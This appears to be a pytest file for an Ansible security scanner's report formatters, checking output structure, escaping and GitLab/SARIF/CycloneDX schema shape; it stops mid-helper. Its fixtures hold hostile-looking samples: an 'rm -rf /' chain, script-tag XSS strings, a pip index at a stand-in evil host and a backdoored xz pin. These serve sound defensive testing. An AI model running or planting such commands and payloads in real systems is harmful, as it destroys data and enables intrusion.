#!/usr/bin/env python3
"""
Formatter unit tests for ansible-security-scanner.

These tests exercise every OutputFormatter against a deterministic, in-process
ScanReport fixture - no subprocess, no real scanning - and verify that the
emitted document is both *parseable* AND that it *round-trips the data*
(rule IDs, severities, file paths, line numbers, counts, and structure).

They also cover the empty-report path (zero findings) and a handful of
content-safety cases (HTML escaping of code snippets, CSV special chars,
XML special chars). Run them with:

    pytest tests/test_formatters.py -v

or as part of the full suite with `pytest`.
"""

from __future__ import annotations

import csv
import io
import json
import sys
import xml.etree.ElementTree as ET
from pathlib import Path

import pytest
import yaml

# Make the in-tree package importable whether or not it's installed.
SCANNER_ROOT = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(SCANNER_ROOT / "src"))

from ansible_security_scanner.formatters import (  # noqa: E402
    CSVFormatter,
    CycloneDXFormatter,
    GitLabSastFormatter,
    HTMLFormatter,
    JSONFormatter,
    JUnitFormatter,
    MarkdownFormatter,
    SARIFFormatter,
    XMLFormatter,
    YAMLFormatter,
)
from ansible_security_scanner.models import (  # noqa: E402
    ScanReport,
    SecurityFinding,
)
from ansible_security_scanner.score_calculator import ScoreCalculator  # noqa: E402


def _make_findings() -> list[SecurityFinding]:
    """A small but representative set of findings across every severity."""
    return [
        SecurityFinding(
            file_path="playbooks/deploy.yml",
            line_number=12,
            rule_id="CREDS_HARDCODED_PASSWORD",
            severity="CRITICAL",
            title="Hardcoded password detected",
            description="A plaintext password was found in the playbook.",
            recommendation="Move the secret into ansible-vault.",
            code_snippet='password: "hunter2"',
            remediation_example='```yaml\npassword: "{{ vault_password }}"\n```',
        ),
        SecurityFinding(
            file_path="playbooks/deploy.yml",
            line_number=47,
            rule_id="CMD_SHELL_USAGE",
            severity="HIGH",
            title="Shell module used where a specific module would be safer",
            description="Prefer specific modules over `shell:` to avoid command injection.",
            recommendation="Use the `command` or a specific module.",
            code_snippet="shell: rm -rf {{ path }}",
            remediation_example='```yaml\nansible.builtin.file:\n  path: "{{ path }}"\n  state: absent\n```',
        ),
        SecurityFinding(
            file_path="roles/web/tasks/main.yml",
            line_number=3,
            rule_id="URL_HTTP_INSECURE",
            severity="MEDIUM",
            title="Insecure HTTP URL",
            description="A plaintext HTTP URL was used for a remote resource.",
            recommendation="Use HTTPS instead.",
            code_snippet="get_url: http://example.com/artifact.tar.gz",
            remediation_example="```yaml\nget_url:\n  url: https://example.com/artifact.tar.gz\n```",
        ),
        SecurityFinding(
            file_path="roles/web/tasks/main.yml",
            line_number=88,
            rule_id="HYGIENE_NO_CHANGED_WHEN",
            severity="LOW",
            title="Task lacks changed_when / check_mode hygiene",
            description="Task will always report as changed.",
            recommendation="Add changed_when or check_mode.",
            code_snippet="command: /usr/bin/true",
            remediation_example="```yaml\ncommand: /usr/bin/true\nchanged_when: false\n```",
        ),
    ]


def _summary_for(findings: list[SecurityFinding]) -> dict[str, int]:
    """Mirror Scanner._generate_summary so fixtures match real reports."""
    return {
        "total_findings": len(findings),
        "critical": sum(1 for f in findings if f.severity == "CRITICAL"),
        "high": sum(1 for f in findings if f.severity == "HIGH"),
        "medium": sum(1 for f in findings if f.severity == "MEDIUM"),
        "low": sum(1 for f in findings if f.severity == "LOW"),
    }


def _make_report(
    findings: list[SecurityFinding] | None = None,
    components: list[dict] | None = None,
) -> ScanReport:
    findings = findings if findings is not None else _make_findings()
    file_names = sorted({f.file_path for f in findings})
    score = ScoreCalculator().calculate_security_score(
        findings, scanned_files=max(1, len(file_names))
    )
    return ScanReport(
        scan_timestamp="2026-04-28T18:00:00",
        ansible_directory="/tmp/playbooks",
        total_files_scanned=len(file_names) or 1,
        scanned_file_names=file_names or ["empty/placeholder.yml"],
        findings=findings,
        summary=_summary_for(findings),
        security_score=score,
        components=components or [],
    )


@pytest.fixture
def report() -> ScanReport:
    return _make_report()


@pytest.fixture
def empty_report() -> ScanReport:
    return _make_report(findings=[])


ALL_FORMATTERS = [
    ("markdown", MarkdownFormatter),
    ("json", JSONFormatter),
    ("xml", XMLFormatter),
    ("yaml", YAMLFormatter),
    ("csv", CSVFormatter),
    ("html", HTMLFormatter),
    ("junit", JUnitFormatter),
    ("sarif", SARIFFormatter),
    ("gl-sast", GitLabSastFormatter),
    ("cyclonedx", CycloneDXFormatter),
]


@pytest.mark.parametrize("fmt_name,fmt_cls", ALL_FORMATTERS)
def test_formatter_produces_nonempty_str(report, fmt_name, fmt_cls):
    """Every formatter returns a non-empty string for a populated report."""
    out = fmt_cls().format(report)
    assert isinstance(out, str), f"{fmt_name} returned {type(out).__name__}, expected str"
    assert out.strip(), f"{fmt_name} returned empty/whitespace-only output"


@pytest.mark.parametrize("fmt_name,fmt_cls", ALL_FORMATTERS)
def test_formatter_handles_empty_report(empty_report, fmt_name, fmt_cls):
    """Formatters must not crash on a zero-finding report."""
    out = fmt_cls().format(empty_report)
    assert isinstance(out, str)
    assert out.strip(), f"{fmt_name} returned empty output for empty report"


def test_json_roundtrips_findings(report):
    payload = json.loads(JSONFormatter().format(report))

    assert set(payload.keys()) >= {
        "scan_timestamp",
        "ansible_directory",
        "total_files_scanned",
        "findings",
        "summary",
        "security_score",
    }

    assert isinstance(payload["findings"], list)
    assert len(payload["findings"]) == len(report.findings)

    emitted_rule_ids = [f["rule_id"] for f in payload["findings"]]
    expected_rule_ids = [f.rule_id for f in report.findings]
    assert emitted_rule_ids == expected_rule_ids

    assert payload["summary"]["total_findings"] == len(report.findings)
    assert payload["summary"]["critical"] == 1
    assert payload["summary"]["high"] == 1
    assert payload["summary"]["medium"] == 1
    assert payload["summary"]["low"] == 1


def test_json_empty_report_has_empty_findings_list(empty_report):
    payload = json.loads(JSONFormatter().format(empty_report))
    assert payload["findings"] == []
    assert payload["summary"]["total_findings"] == 0
    assert payload["security_score"]["overall_score"] == 100


def _cve_finding(cves: list[str]) -> SecurityFinding:
    """Minimal finding carrying a structured CVE list."""
    return SecurityFinding(
        file_path="playbooks/install.yml",
        line_number=10,
        rule_id="xz_liblzma_backdoored_version_install",
        severity="CRITICAL",
        title="xz/liblzma backdoor (CVE-2024-3094) install",
        description="Pinning to a backdoored xz release.",
        recommendation="Upgrade to xz 5.6.2 or downgrade to 5.4.x.",
        code_snippet="apt: name=xz-utils=5.6.0",
        remediation_example="```yaml\napt: name=xz-utils=5.6.2\n```",
        cve=cves,
    )


def test_json_emits_cve_in_framework_references():
    report = _make_report(findings=[_cve_finding(["CVE-2024-3094"])])
    payload = json.loads(JSONFormatter().format(report))
    refs = payload["findings"][0]["framework_references"]
    cves = [r for r in refs if r["framework"] == "CVE"]
    assert cves, "expected at least one CVE framework reference"
    assert cves[0]["id"] == "CVE-2024-3094"
    assert cves[0]["url"] == "https://nvd.nist.gov/vuln/detail/CVE-2024-3094"


def test_json_synthesizes_uncatalogued_cve_url():
    """Valid CVE not in cve.yml still gets an NVD URL via synthesized fallback."""
    report = _make_report(findings=[_cve_finding(["CVE-1999-0001"])])
    payload = json.loads(JSONFormatter().format(report))
    refs = payload["findings"][0]["framework_references"]
    cves = [r for r in refs if r["framework"] == "CVE"]
    assert cves and cves[0]["url"] == "https://nvd.nist.gov/vuln/detail/CVE-1999-0001"


def test_sarif_includes_cve_tag():
    report = _make_report(findings=[_cve_finding(["CVE-2024-3094"])])
    doc = json.loads(SARIFFormatter().format(report))
    rule = doc["runs"][0]["tool"]["driver"]["rules"][0]
    tags = rule["properties"]["tags"]
    assert "CVE-2024-3094" in tags


def test_finding_without_cve_has_empty_list_default():
    f = SecurityFinding(
        file_path="x.yml",
        line_number=1,
        rule_id="any_rule",
        severity="LOW",
        title="t",
        description="d",
        recommendation="r",
        code_snippet="",
        remediation_example="",
    )
    assert f.cve == []


def test_yaml_roundtrips_findings(report):
    doc = yaml.safe_load(YAMLFormatter().format(report))
    assert isinstance(doc, dict)
    assert "findings" in doc and isinstance(doc["findings"], list)
    assert len(doc["findings"]) == len(report.findings)
    assert {f["rule_id"] for f in doc["findings"]} == {f.rule_id for f in report.findings}


def test_sarif_is_valid_2_1_0(report):
    doc = json.loads(SARIFFormatter().format(report))

    assert doc["version"].startswith("2.1")
    assert "$schema" in doc
    assert isinstance(doc["runs"], list) and doc["runs"]

    run = doc["runs"][0]
    assert run["tool"]["driver"]["name"] == "Ansible Security Scanner"
    assert isinstance(run["results"], list)
    assert len(run["results"]) == len(report.findings)

    # Severity -> SARIF level mapping. Order follows the finding list.
    expected_levels = ["error", "error", "warning", "note"]
    actual_levels = [r["level"] for r in run["results"]]
    assert actual_levels == expected_levels

    # Every result must carry a rule id and a physical location.
    for result, finding in zip(run["results"], report.findings):
        assert result["ruleId"] == finding.rule_id
        loc = result["locations"][0]["physicalLocation"]
        assert loc["artifactLocation"]["uri"] == finding.file_path
        assert loc["region"]["startLine"] == finding.line_number


def test_sarif_empty_report_has_empty_results(empty_report):
    doc = json.loads(SARIFFormatter().format(empty_report))
    assert doc["runs"][0]["results"] == []


def test_xml_is_wellformed_and_has_findings(report):
    root = ET.fromstring(XMLFormatter().format(report))
    assert root.tag == "AnsibleSecurityScanReport"

    findings_node = root.find("Findings")
    assert findings_node is not None
    finding_elems = findings_node.findall("Finding")
    assert len(finding_elems) == len(report.findings)

    for elem, finding in zip(finding_elems, report.findings):
        assert elem.get("ruleId") == finding.rule_id
        assert elem.get("severity") == finding.severity
        assert elem.findtext("FilePath") == finding.file_path
        assert elem.findtext("LineNumber") == str(finding.line_number)

    summary = root.find("Summary")
    assert summary is not None
    assert summary.findtext("TotalFindings") == str(len(report.findings))
    assert summary.findtext("Critical") == "1"


def test_xml_escapes_special_characters_correctly():
    """XML output must be well-formed AND round-trip special chars cleanly.

    ElementTree escapes element text on serialization. The formatter must
    not double-escape (a past bug produced e.g. '&amp;lt;script&amp;gt;').
    After parsing, findtext() should return the original characters.
    """
    finding = SecurityFinding(
        file_path="p.yml",
        line_number=1,
        rule_id="RULE_SPECIAL",
        severity="HIGH",
        title="Title <with> & chars",
        description="Desc with <tag> & ampersand",
        recommendation="Fix <it>",
        code_snippet='shell: echo "<script>alert(1)</script>" && rm -rf /',
        remediation_example="```yaml\n# a & b < c > d\n```",
    )
    report = _make_report(findings=[finding])
    out = XMLFormatter().format(report)
    root = ET.fromstring(out)  # Must parse - no ParseError raised.

    elem = root.find("Findings/Finding")
    assert elem is not None
    assert elem.get("ruleId") == "RULE_SPECIAL"

    # The parsed snippet must equal the original characters, not an
    # escaped form. Guards against double-escaping regressions.
    snippet = elem.findtext("CodeSnippet") or ""
    assert "<script>alert(1)</script>" in snippet
    assert "&&" in snippet
    assert "&lt;" not in snippet and "&amp;" not in snippet, f"XML text double-escaped: {snippet!r}"


def test_junit_is_wellformed_and_counts_match(report):
    root = ET.fromstring(JUnitFormatter().format(report))
    assert root.tag == "testsuites"
    assert root.get("tests") == str(len(report.findings))
    # CRITICAL + HIGH = 2 failures
    assert root.get("failures") == "2"
    # MEDIUM + LOW = 2 errors
    assert root.get("errors") == "2"

    # Every testcase has a <failure> with the rule id as type.
    rule_ids_in_xml = {failure.get("type") for failure in root.findall(".//failure")}
    assert rule_ids_in_xml == {f.rule_id for f in report.findings}


def test_csv_has_header_and_one_row_per_finding(report):
    text = CSVFormatter().format(report)
    rows = list(csv.reader(io.StringIO(text)))

    assert len(rows) == len(report.findings) + 1, "Expected header + one row per finding"
    header = rows[0]
    assert header[:4] == ["File Path", "Line Number", "Rule ID", "Severity"]

    # Rows preserve rule_id, severity, file_path, line_number.
    for row, finding in zip(rows[1:], report.findings):
        assert row[0] == finding.file_path
        assert row[1] == str(finding.line_number)
        assert row[2] == finding.rule_id
        assert row[3] == finding.severity


def test_csv_handles_quotes_and_commas_in_fields():
    """CSV output must properly quote/escape fields containing , " or \\n."""
    finding = SecurityFinding(
        file_path="p.yml",
        line_number=1,
        rule_id="RULE_CSV",
        severity="MEDIUM",
        title='Weird, "quoted" title',
        description="Line one\nLine two, with comma",
        recommendation='Use "safer" modules',
        code_snippet='shell: echo "hello, world"',
        remediation_example="```yaml\n# safe\n```",
    )
    report = _make_report(findings=[finding])
    text = CSVFormatter().format(report)
    rows = list(csv.reader(io.StringIO(text)))
    assert len(rows) == 2, f"expected header+1 row, got {len(rows)}"
    assert rows[1][2] == "RULE_CSV"
    # Values with quotes round-trip through the csv module without blowing up.
    assert "quoted" in rows[1][4]


def test_html_has_structure_and_finding_content(report):
    out = HTMLFormatter().format(report)
    lower = out.lower()

    assert "<!doctype html>" in lower
    assert "</html>" in lower

    # Every finding's file path appears somewhere in the document.
    for f in report.findings:
        assert f.file_path in out, f"{f.file_path} missing from HTML output"
        assert f.rule_id in out, f"{f.rule_id} missing from HTML output"

    # Severity badges render.
    for sev in ("CRITICAL", "HIGH", "MEDIUM", "LOW"):
        assert f"severity-{sev}" in out


def test_html_escapes_code_snippets_to_prevent_xss():
    """Code snippets must be HTML-escaped, not rendered as live HTML."""
    finding = SecurityFinding(
        file_path="p.yml",
        line_number=1,
        rule_id="RULE_XSS",
        severity="HIGH",
        title="XSS test",
        description="Plain description",
        recommendation="Escape output",
        code_snippet='<script>alert("pwned")</script>',
        remediation_example="```yaml\n# safe\n```",
    )
    report = _make_report(findings=[finding])
    out = HTMLFormatter().format(report)

    # The raw <script> tag from the code snippet must not appear verbatim;
    # it must be escaped to &lt;script&gt;.
    assert '<script>alert("pwned")</script>' not in out
    assert "&lt;script&gt;" in out


def test_markdown_contains_header_and_severity_counts(report):
    md = MarkdownFormatter().format(report)
    assert "Ansible Security Scan Report" in md
    # Executive Summary table references every severity.
    for sev in ("CRITICAL", "HIGH", "MEDIUM", "LOW"):
        assert sev in md
    # The critical finding is serialized with its title.
    assert "Hardcoded password detected" in md


def test_markdown_inline_code_snippet_skips_task_title_for_multiline():
    """``Code: ...`` previews must not collapse to a bare ``- name: ...`` line.

    The inline preview is the only snippet a reader sees on the
    summary row of the markdown report; if the multi-line snippet
    starts with a task title (which it routinely does for AST-anchored
    rules), the formatter must skip the title and surface the next
    line - the actual module signature - instead. Otherwise every
    such finding renders as ``Code: \\`- name: trigger pip ...\\``` -
    evidence-free prose that forces the reader into the source.
    """
    snippet = (
        "- name: trigger pip index url plaintext http\n"
        "  ansible.builtin.pip:\n"
        "    name: some-package\n"
        "    extra_args: --index-url http://pypi.evil.example/simple"
    )
    rendered = MarkdownFormatter._inline_code_snippet(snippet)
    assert not rendered.startswith("- name:"), (
        f"inline preview leaked task title instead of module signature: {rendered!r}"
    )
    assert "ansible.builtin.pip" in rendered
    assert rendered.endswith("..."), "multi-line preview should end with an ellipsis"


def test_markdown_inline_code_snippet_keeps_single_line_verbatim():
    """For single-line snippets the preview is the line itself, no ellipsis."""
    rendered = MarkdownFormatter._inline_code_snippet("    validate_certs: false")
    assert rendered == "validate_certs: false"


def test_markdown_inline_code_snippet_handles_empty_input():
    assert MarkdownFormatter._inline_code_snippet("") == ""
    assert MarkdownFormatter._inline_code_snippet("   \n  \n") == ""


def test_markdown_show_all_flag_is_respected():
    """With >10 CRITICAL findings, the default view truncates; show_all=True doesn't."""
    findings = [
        SecurityFinding(
            file_path=f"p{i}.yml",
            line_number=i,
            rule_id=f"RULE_CRIT_{i:02d}",
            severity="CRITICAL",
            title=f"Critical issue #{i}",
            description="...",
            recommendation="...",
            code_snippet="...",
            remediation_example="...",
        )
        for i in range(15)
    ]
    report = _make_report(findings=findings)

    default_md = MarkdownFormatter(show_all=False).format(report)
    full_md = MarkdownFormatter(show_all=True).format(report)

    assert "more critical issues" in default_md
    assert "more critical issues" not in full_md
    # Every rule id appears when show_all=True.
    for f in findings:
        assert f.rule_id in full_md or f.title in full_md


def _make_components() -> list[dict]:
    """Realistic component inventory spanning every kind produced by
    DependencyCollector. We use this to exercise the full CycloneDX mapping."""
    return [
        {
            "type": "collection",
            "name": "community.general",
            "version": "7.5.0",
            "source": "",
            "purl": "pkg:ansible-collection/community.general@7.5.0",
        },
        {
            "type": "role",
            "name": "geerlingguy.nginx",
            "version": "",
            "source": "https://github.com/geerlingguy/ansible-role-nginx",
            "purl": "pkg:ansible-role/geerlingguy.nginx",
        },
        {
            "type": "pip",
            "name": "requests",
            "version": "2.31.0",
            "source": "",
            "purl": "pkg:pypi/requests@2.31.0",
        },
        {
            "type": "system",
            "name": "openssl",
            "version": ">=3.0",
            "source": "",
            "purl": "pkg:generic/openssl@>=3.0",
        },
        {
            "type": "container",
            "name": "quay.io/ansible/creator-ee",
            "version": "latest",
            "source": "",
            "purl": "pkg:oci/quay.io/ansible/creator-ee@latest",
        },
    ]


def test_cyclonedx_structure_and_spec_version():
    """SBOM must conform to CycloneDX 1.5 top-level shape."""
    rep = _make_report(components=_make_components())
    doc = json.loads(CycloneDXFormatter().format(rep))

    assert doc["bomFormat"] == "CycloneDX"
    assert doc["specVersion"] == "1.5"
    assert doc["version"] == 1
    assert doc["serialNumber"].startswith("urn:uuid:")
    assert "$schema" in doc
    assert "metadata" in doc
    assert "components" in doc
    assert "vulnerabilities" in doc


def test_cyclonedx_metadata_has_tool_and_timestamp():
    rep = _make_report(components=_make_components())
    doc = json.loads(CycloneDXFormatter().format(rep))
    md = doc["metadata"]

    assert md["timestamp"].endswith("Z") or "+" in md["timestamp"]
    tools = md["tools"]["components"]
    assert any(t["name"] == "ansible-security-scanner" for t in tools)
    assert md["component"]["type"] == "application"
    assert md["component"]["name"]  # root name derived from directory


def test_cyclonedx_components_round_trip_all_kinds():
    """Every DependencyCollector kind maps to a CDX Component with type,
    name, bom-ref, and purl when available."""
    components = _make_components()
    rep = _make_report(components=components)
    doc = json.loads(CycloneDXFormatter().format(rep))
    out_by_name = {c["name"]: c for c in doc["components"]}

    assert len(doc["components"]) == len(components)
    for src in components:
        c = out_by_name[src["name"]]
        assert c["bom-ref"]
        assert c.get("purl") == src["purl"]
        kinds = {p["value"] for p in c.get("properties", []) if p.get("name") == "ansible:type"}
        assert src["type"] in kinds

    # Container kind stays a CycloneDX `container`, everything else `library`.
    assert out_by_name["quay.io/ansible/creator-ee"]["type"] == "container"
    for n in ("community.general", "geerlingguy.nginx", "requests", "openssl"):
        assert out_by_name[n]["type"] == "library"


def test_cyclonedx_vulnerabilities_dedupe_by_rule_id():
    """Multiple findings sharing a rule_id must collapse to one vuln entry."""
    findings = [
        SecurityFinding(
            file_path=f"p{i}.yml",
            line_number=i,
            rule_id="hardcoded_credentials",
            severity="CRITICAL",
            title="dupe",
            description="...",
            recommendation="...",
            code_snippet="...",
            remediation_example="...",
        )
        for i in range(5)
    ]
    rep = _make_report(findings=findings)
    doc = json.loads(CycloneDXFormatter().format(rep))

    vuln_ids = [v["id"] for v in doc["vulnerabilities"]]
    assert vuln_ids == ["hardcoded_credentials"]  # deduped


def test_cyclonedx_vulnerability_shape():
    """Each vuln entry carries id, severity rating, description, and
    affects[].ref. This is what Dependency-Track / GitHub consume."""
    rep = _make_report(components=_make_components())
    doc = json.loads(CycloneDXFormatter().format(rep))

    for v in doc["vulnerabilities"]:
        assert "bom-ref" in v and v["bom-ref"].startswith("vuln-")
        assert v["id"]
        assert v["description"]
        rating = v["ratings"][0]
        assert rating["severity"] in ("critical", "high", "medium", "low", "unknown")
        assert rating["method"] == "other"
        assert v["affects"] == [{"ref": "root-component"}]
        assert v["source"]["name"] == "ansible-security-scanner"


def test_cyclonedx_empty_report_is_valid(empty_report):
    doc = json.loads(CycloneDXFormatter().format(empty_report))
    assert doc["bomFormat"] == "CycloneDX"
    assert doc["components"] == []
    assert doc["vulnerabilities"] == []


def test_cyclonedx_registered_in_get_formatter_class():
    """The public formatter registry must surface CycloneDX under both
    'cyclonedx' and 'sbom' aliases so CI pipelines can use either."""
    from ansible_security_scanner.utils import get_formatter_class

    assert get_formatter_class("cyclonedx") is CycloneDXFormatter
    assert get_formatter_class("sbom") is CycloneDXFormatter
    assert get_formatter_class("CycloneDX") is CycloneDXFormatter  # case-insensitive


def test_cyclonedx_bomref_stable_across_runs():
    """bom-ref should be deterministic for a given component so diff-oriented
    consumers (e.g. Dependency-Track) can track versions across BOMs."""
    components = _make_components()
    rep1 = _make_report(components=components)
    rep2 = _make_report(components=components)
    d1 = json.loads(CycloneDXFormatter().format(rep1))
    d2 = json.loads(CycloneDXFormatter().format(rep2))

    refs1 = {c["name"]: c["bom-ref"] for c in d1["components"]}
    refs2 = {c["name"]: c["bom-ref"] for c in d2["components"]}
    assert refs1 == refs2


#
# Generic ``non-empty string`` and ``empty report`` coverage comes from
# the ALL_FORMATTERS parametrize above. The assertions below are about
# GitLab-specific schema shape: top-level keys, severity mapping,
# identifiers[] ordering/dedup, stable ids, and the tracking/signature
# block GitLab needs for cross-run dedup. We don't validate against the
# published JSON schema (pulling ``jsonschema`` as a test-time dep for a
# single formatter is overkill and the schema has version drift) -
# instead we assert the exact shape GitLab's SAST ingestion relies on:
# https://docs.gitlab.com/ee/user/application_security/sast/#gitlab-sast-report-format


def _gitlab_finding(**overrides) -> SecurityFinding:
    """Small factory so each GitLab-SAST test can tweak one field."""
    defaults = {
        "file_path": "playbooks/deploy.yml",
        "line_number": 42,
        "rule_id": "HARDCODED_PASSWORD",
        "severity": "CRITICAL",
        "title": "Hardcoded password detected",
        "description": "A plaintext password was found in the playbook.",
        "recommendation": "Move the secret into ansible-vault.",
        "code_snippet": 'password: "hunter2"',
        "remediation_example": '```yaml\npassword: "{{ vault_password }}"\n```',
        "cwe": ["CWE-798"],
        "mitre_attack": ["T1552.001"],
        "cis_controls": ["CIS-3.1"],
        "mitre_atlas": [],
        "references": [
            "https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/"
        ],
    }
    defaults.update(overrides)
    return SecurityFinding(**defaults)


def test_gitlab_sast_top_level_keys_and_version():
    """Report has the three top-level keys GitLab requires + pinned schema."""
    doc = json.loads(GitLabSastFormatter().format(_make_report([_gitlab_finding()])))
    assert set(doc) == {"version", "vulnerabilities", "scan"}
    assert doc["version"].startswith("15.")


def test_gitlab_sast_scan_block_is_well_formed():
    doc = json.loads(GitLabSastFormatter().format(_make_report([_gitlab_finding()])))
    scan = doc["scan"]
    assert scan["type"] == "sast"
    assert scan["status"] == "success"
    for key in ("analyzer", "scanner"):
        assert scan[key]["id"] == "ansible-security-scanner"
        assert scan[key]["name"] == "Ansible Security Scanner"
        assert "vendor" in scan[key] and "name" in scan[key]["vendor"]
    assert scan["start_time"] == scan["end_time"] == "2026-04-28T18:00:00"


def test_gitlab_sast_empty_report_has_empty_vulnerabilities():
    doc = json.loads(GitLabSastFormatter().format(_make_report([])))
    assert doc["vulnerabilities"] == []
    assert doc["scan"]["status"] == "success"


@pytest.mark.parametrize(
    "finding_severity, expected",
    [
        ("CRITICAL", "Critical"),
        ("HIGH", "High"),
        ("MEDIUM", "Medium"),
        ("LOW", "Low"),
        ("INFO", "Info"),
        ("SOMETHING_WEIRD", "Unknown"),
    ],
)
def test_gitlab_sast_severity_mapping(finding_severity, expected):
    f = _gitlab_finding(severity=finding_severity)
    doc = json.loads(GitLabSastFormatter().format(_make_report([f])))
    assert doc["vulnerabilities"][0]["severity"] == expected


def test_gitlab_sast_identifiers_ordering_and_dedup():
    """Primary identifier is the scanner rule id; CWE/MITRE follow; no dups."""
    f = _gitlab_finding(
        cwe=["CWE-798", "CWE-798"],
        mitre_attack=["T1552.001"],
        mitre_atlas=["AML.T0051"],
    )
    vuln = json.loads(GitLabSastFormatter().format(_make_report([f])))["vulnerabilities"][0]
    ident_types = [i["type"] for i in vuln["identifiers"]]

    assert ident_types[0] == "ansible_security_scanner_rule_id"
    assert vuln["identifiers"][0]["value"] == "HARDCODED_PASSWORD"

    assert ident_types.count("cwe") == 1
    assert ident_types.count("mitre_attack") == 1
    assert ident_types.count("mitre_atlas") == 1


def test_gitlab_sast_cwe_identifier_numeric_value():
    """GitLab's CWE identifier expects the bare numeric value, not 'CWE-798'."""
    vuln = json.loads(
        GitLabSastFormatter().format(_make_report([_gitlab_finding(cwe=["CWE-798"])]))
    )["vulnerabilities"][0]
    cwe_ident = next(i for i in vuln["identifiers"] if i["type"] == "cwe")
    assert cwe_ident["value"] == "798"
    assert cwe_ident["url"].endswith("/798.html")


def test_gitlab_sast_owasp_appsec_from_structured_field():
    """OWASP AppSec Top-10 ids surface as structured `owasp` identifiers."""
    f = _gitlab_finding(owasp_appsec=["A03:2021"])
    vuln = json.loads(GitLabSastFormatter().format(_make_report([f])))["vulnerabilities"][0]
    owasp_idents = [i for i in vuln["identifiers"] if i["type"] == "owasp"]
    assert any(i["value"] == "A03:2021" for i in owasp_idents)
    assert any("owasp.org" in i.get("url", "") for i in owasp_idents)


def test_gitlab_sast_owasp_llm_from_structured_field():
    """OWASP LLM Top-10 ids (LLM01...) come from ``owasp_llm``, not free text."""
    f = _gitlab_finding(owasp_llm=["LLM03"])
    vuln = json.loads(GitLabSastFormatter().format(_make_report([f])))["vulnerabilities"][0]
    owasp_values = [i["value"] for i in vuln["identifiers"] if i["type"] == "owasp"]
    assert "LLM03" in owasp_values


def test_gitlab_sast_asvs_uses_dedicated_type():
    """ASVS ids emit a distinct ``owasp_asvs`` identifier type."""
    f = _gitlab_finding(owasp_asvs=["V13.3.1"])
    vuln = json.loads(GitLabSastFormatter().format(_make_report([f])))["vulnerabilities"][0]
    asvs_idents = [i for i in vuln["identifiers"] if i["type"] == "owasp_asvs"]
    assert len(asvs_idents) == 1
    assert asvs_idents[0]["value"] == "V13.3.1"
    assert asvs_idents[0]["name"].startswith("ASVS V13.3.1")


def test_gitlab_sast_unknown_owasp_id_is_dropped_silently():
    """Unknown OWASP ids must not crash and must not produce bogus identifiers."""
    f = _gitlab_finding(owasp_appsec=["A99:2021"], owasp_llm=["LLM99"], owasp_asvs=["V99"])
    vuln = json.loads(GitLabSastFormatter().format(_make_report([f])))["vulnerabilities"][0]
    assert not [i for i in vuln["identifiers"] if i["type"] in ("owasp", "owasp_asvs")]


def test_gitlab_sast_finding_without_cwe_still_has_primary_identifier():
    """Even a finding with no compliance tags must carry one identifier."""
    f = _gitlab_finding(cwe=[], mitre_attack=[], mitre_atlas=[], references=[], description="x")
    vuln = json.loads(GitLabSastFormatter().format(_make_report([f])))["vulnerabilities"][0]
    assert len(vuln["identifiers"]) == 1
    assert vuln["identifiers"][0]["type"] == "ansible_security_scanner_rule_id"


def test_gitlab_sast_location_and_tracking_are_per_finding():
    f = _gitlab_finding(line_number=123, file_path="roles/web/tasks/main.yml")
    vuln = json.loads(GitLabSastFormatter().format(_make_report([f])))["vulnerabilities"][0]

    assert vuln["location"] == {
        "file": "roles/web/tasks/main.yml",
        "start_line": 123,
        "end_line": 123,
    }

    tracking = vuln["tracking"]
    assert tracking["type"] == "source"
    assert tracking["items"][0]["file"] == "roles/web/tasks/main.yml"
    assert tracking["items"][0]["line_start"] == 123
    assert tracking["items"][0]["line_end"] == 123
    assert tracking["items"][0]["signatures"][0]["algorithm"] == "scope_offset"


def test_gitlab_sast_stable_id_is_deterministic_across_runs():
    """Same finding inputs must yield the same ``id`` - that's how GitLab
    dedups across pipeline runs. Any non-determinism here would show as
    'new vulnerability' churn in the MR widget on every scan."""
    f1 = _gitlab_finding()
    f2 = _gitlab_finding()
    id1 = json.loads(GitLabSastFormatter().format(_make_report([f1])))["vulnerabilities"][0]["id"]
    id2 = json.loads(GitLabSastFormatter().format(_make_report([f2])))["vulnerabilities"][0]["id"]
    assert id1 == id2
    assert id1.startswith("HARDCODED_PASSWORD:")


def test_gitlab_sast_stable_id_changes_when_file_or_line_change():
    id_a = json.loads(
        GitLabSastFormatter().format(_make_report([_gitlab_finding(line_number=10)]))
    )["vulnerabilities"][0]["id"]
    id_b = json.loads(
        GitLabSastFormatter().format(_make_report([_gitlab_finding(line_number=20)]))
    )["vulnerabilities"][0]["id"]
    assert id_a != id_b


def test_gitlab_sast_solution_prefers_remediation_example_over_recommendation():
    f = _gitlab_finding(
        recommendation="plain recommendation text",
        remediation_example="```yaml\nvaulted: example\n```",
    )
    vuln = json.loads(GitLabSastFormatter().format(_make_report([f])))["vulnerabilities"][0]
    assert "vaulted: example" in vuln["solution"]
    assert "plain recommendation text" not in vuln["solution"]


def test_gitlab_sast_solution_falls_back_to_recommendation():
    f = _gitlab_finding(recommendation="Just use vault.", remediation_example="")
    vuln = json.loads(GitLabSastFormatter().format(_make_report([f])))["vulnerabilities"][0]
    assert vuln["solution"] == "Just use vault."


def test_gitlab_sast_description_embeds_code_snippet_and_references():
    f = _gitlab_finding(
        description="Plaintext password.",
        code_snippet='password: "hunter2"',
        references=["https://ref-one.example", "https://ref-two.example"],
    )
    desc = json.loads(GitLabSastFormatter().format(_make_report([f])))["vulnerabilities"][0][
        "description"
    ]
    assert "Plaintext password." in desc
    assert 'password: "hunter2"' in desc
    assert "https://ref-one.example" in desc
    assert "https://ref-two.example" in desc


def test_gitlab_sast_multi_finding_report_keeps_order_and_counts():
    findings = [
        _gitlab_finding(rule_id="R1", severity="CRITICAL", line_number=1),
        _gitlab_finding(rule_id="R2", severity="HIGH", line_number=2),
        _gitlab_finding(rule_id="R3", severity="MEDIUM", line_number=3),
        _gitlab_finding(rule_id="R4", severity="LOW", line_number=4),
    ]
    doc = json.loads(GitLabSastFormatter().format(_make_report(findings)))
    vulns = doc["vulnerabilities"]
    assert [v["location"]["start_line"] for v in vulns] == [1, 2, 3, 4]
    assert [v["severity"] for v in vulns] == ["Critical", "High", "Medium", "Low"]


def _collect_from_playbook(playbook_yaml: str) -> list[dict]:
    """Helper: run DependencyCollector end-to-end on an in-memory playbook.

    Keeps tests hermetic (no disk writes, no real scanning) while still
    exercising the full YAML-parse -> _walk_tasks -> _walk_rendered_manifest
    codepath.
    """
    from pathlib import Path as _Path

    import yaml as _yaml

    from ansible_security_scanner.file_scanner import DependencyCollector

    data = _yaml.safe_load(playbook_yaml)
